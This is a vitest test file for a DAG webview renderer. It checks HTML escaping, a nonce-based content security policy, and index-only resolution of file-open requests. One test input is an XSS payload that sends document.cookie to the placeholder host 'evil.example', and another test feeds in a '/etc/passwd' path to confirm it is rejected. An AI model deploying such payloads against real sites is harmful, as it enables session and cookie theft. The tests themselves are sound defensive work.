import { describe, it, expect } from 'vitest';
import { buildDagHtml, escapeHtml, resolveOpenRequest, type DagData } from '../dag-view.js';

const evilName = `<img src=x onerror="fetch('https://evil.example/'+document.cookie)">`;

function data(name: string): DagData {
  return {
    hasConstitution: true,
    specs: [{
      name,
      phases: [
        { type: 'requirements', status: 'approved', filePath: `/ws/specs/${name}/spec.md` },
        { type: 'design', status: 'pending', filePath: `/ws/specs/${name}/plan.md` },
        { type: 'tasks', status: 'pending', filePath: `/ws/specs/${name}/tasks.md` },
      ],
      tasksDone: 1,
      tasksTotal: 3,
    }],
  };
}

describe('buildDagHtml', () => {
  it('escapes spec folder names so they cannot inject markup', () => {
    const { html } = buildDagHtml(data(evilName), 'n0nce');
    expect(html).not.toContain('<img');
    expect(html).not.toContain('onerror="');
    expect(html).toContain('&lt;img src=x onerror=&quot;fetch(');
  });

  it('puts no file paths and no inline event handlers in the markup', () => {
    const { html } = buildDagHtml(data("it's-a-trap"), 'n0nce');
    expect(html).not.toMatch(/\son\w+\s*=/i);
    expect(html).not.toContain('/ws/specs/');
    expect(html).toContain('data-index="0"');
    expect(html).toContain('data-index="2"');
  });

  it('declares a CSP that only runs the nonced script', () => {
    const { html } = buildDagHtml(data('feature'), 'n0nce');
    expect(html).toContain(`content="default-src 'none'; style-src 'unsafe-inline'; script-src 'nonce-n0nce';"`);
    const scripts = html.match(/<script\b[^>]*>/g) ?? [];
    expect(scripts).toEqual(['<script nonce="n0nce">']);
  });

  it('returns the openable phase files in index order', () => {
    const { openable } = buildDagHtml(data('feature'), 'n');
    expect(openable).toEqual(['/ws/specs/feature/spec.md', '/ws/specs/feature/plan.md', '/ws/specs/feature/tasks.md']);
  });
});

describe('resolveOpenRequest', () => {
  const openable = ['/ws/specs/a/spec.md', '/ws/specs/a/plan.md'];

  it('maps an index to the rendered file', () => {
    expect(resolveOpenRequest({ command: 'openFile', index: 1 }, openable)).toBe('/ws/specs/a/plan.md');
  });

  it.each([
    [{ command: 'openFile', path: '/etc/passwd' }],
    [{ command: 'openFile', index: 5 }],
    [{ command: 'openFile', index: -1 }],
    [{ command: 'openFile', index: 0.5 }],
    [{ command: 'openFile', index: '0' }],
    [{ command: 'other', index: 0 }],
    [null],
    ['openFile'],
  ])('rejects %j', (msg) => {
    expect(resolveOpenRequest(msg, openable)).toBeUndefined();
  });
});

describe('escapeHtml', () => {
  it('escapes all five HTML-significant characters', () => {
    expect(escapeHtml(`&<>"'`)).toBe('&amp;&lt;&gt;&quot;&#39;');
  });
});
